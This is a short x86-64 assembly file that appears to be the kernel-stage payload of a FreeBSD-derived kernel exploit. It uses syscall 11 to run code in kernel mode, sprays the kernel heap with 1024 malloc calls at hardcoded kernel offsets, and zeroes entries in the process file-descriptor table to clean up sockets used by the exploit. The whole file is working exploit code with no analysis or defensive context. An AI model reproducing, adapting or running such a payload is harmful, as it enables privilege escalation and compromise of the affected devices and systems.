use64

entry:
push rsi
push rdi
mov rsi, rsp
lea rdi, [rel kernel_entry]
mov eax, 11
syscall
pop rdi
pop rsi
ret

kernel_entry:
mov rsi, [rsi+8]
push qword [rsi] ; socket closeup
push qword [rsi+8] ; kernel base
mov rcx, 1024
.malloc_loop:
push rcx
mov rax, [rsp+8] ; kernel base
mov edi, 0xf8 ; sz
lea rsi, [rax+0x1540eb0] ; M_TEMP
mov edx, 2
add rax, 0xd7a0 ; malloc
call rax
pop rcx
loop .malloc_loop
pop rdi
pop rsi
test rsi, rsi
jz .skip_closeup
mov rax, [gs:0] ; thread
mov rax, [rax+8] ; td_proc
mov rax, [rax+0x48] ; p_fd
mov rdx, [rax] ; fd_ofiles
mov rcx, 512
.closeup_loop:
lodsd
mov qword [rdx+8*rax], 0
loop .closeup_loop
.skip_closeup:
xor eax, eax
ret
align 8
